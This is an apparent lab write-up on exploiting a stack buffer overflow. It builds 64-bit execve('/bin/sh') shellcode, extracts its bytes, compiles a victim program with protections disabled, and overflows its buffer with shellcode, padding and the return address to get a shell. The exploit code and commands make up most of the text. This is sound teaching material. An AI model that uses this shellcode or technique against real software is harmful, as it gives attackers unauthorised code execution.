# Problem I

This writeup describes how to open a shell from a silly victim program containing a `getc`.

I mainly followed the [ROC tutorial](https://crypto.stanford.edu/~blynn/rop/) with subtle tweaks, the result runs on 64-bit x86 Ubuntu 20.

#### Build the shellcode ####

A simple inline assembly program gets us the shell-opening shellcode:)

Content of [`shellcode.c`](shellcode.c)


```c
// Shell openning shellcode
#include <stdio.h>

int main() {
  asm("\
needle0: jmp there\n\
here:    pop %rdi\n\
         xor %rax, %rax\n\
         movb $0x3b, %al\n\
         xor %rsi, %rsi\n\
         xor %rdx, %rdx\n\
         syscall\n\
there:   call here\n\
.string \"/bin/sh\"\n\
needle1: .octa 0xdeadbeef\n\
  ");
}
```

Build shellcode.
```shell
gcc schellcode.c
```

Now running `a.out` should start a new shell. 

On my machine `a.out` takes about 16KB, but we're only interested in the part that starts the shell.

Inspecting the object dump we can find where the shell starting part of the program really lives.

```shell
objdump -d a.out | sed -n '/needle0/,/needle1/p'
```

On my machine this returned.
```
0000000000001131 <needle0>:
    1131:	eb 0e                	jmp    1141 <there>

0000000000001133 <here>:
    1133:	5f                   	pop    %rdi
    1134:	48 31 c0             	xor    %rax,%rax
    1137:	b0 3b                	mov    $0x3b,%al
    1139:	48 31 f6             	xor    %rsi,%rsi
    113c:	48 31 d2             	xor    %rdx,%rdx
    113f:	0f 05                	syscall 

0000000000001141 <there>:
    1141:	e8 ed ff ff ff       	callq  1133 <here>
    1146:	2f                   	(bad)  
    1147:	62                   	(bad)  
    1148:	69                   	.byte 0x69
    1149:	6e                   	outsb  %ds:(%rsi),(%dx)
    114a:	2f                   	(bad)  
    114b:	73 68                	jae    11b5 <__libc_csu_init+0x45>
	...

000000000000114e <needle1>:
```

For some reason there is no global code offset in the above (unlike the ROC example), ie 0x1131 is the true offset in bytes of <needle0> from the start of the `a.out` file. Notice how the entire shellcode fits in 29 bytes (0x114e - 0x1131).

The following command gets 32 bytes of the `a.out` file offsetted by 0x1131 and creates the `shellcode` file containing these 32 bytes -- the shellcode itself!

```shell
xxd -s0x1131 -l32 -p a.out shellcode
```

Now build the silly victim code.

```shell
gcc -fno-stack-protector -z execstack victim.c -o victim
```

The [victim.c](victim.c) is tweaked to print out address of the buffer. Run it once to get the address. I get the following output:

```
0x7fffffffe3d0
What's your name?
```

Copy the printed buffer address and convert to little endian, save to a variable.

```shell
a=`printf %016x 0x7fffffffe3d0 | tac -rs..`
```

We are ready to hack! The following magic all-in-one shell command pipes the required input to the victim `getc` prompt.

```shell
( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) | setarch `arch` -R ./victim
```

- `( cat shellcode ; printf %080d 0 ; echo $a )` -- appends the content of `shellcode` file, eighty zeros, and address of buffer (from the variable `a`) together.
- `xxd -r -p` -- converts hexdump string to binary.
- `setarch -R` -- disables randomization of address space.

`woop woop` is the magic key to open the secret shell (just kidding any input will do)!
```
0x7fffffffe3d0
What's your name?
woop woop
Hello, ?_H1??;H1?H1??????/bin/sh!
ls    
README.md  a.out  problem1  problem1-ubuntu64.c  problem2.c  shellcode	shellcode.c  victim
uname -a
Linux xenon 5.4.0-72-generic #80-Ubuntu SMP Mon Apr 12 17:35:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```



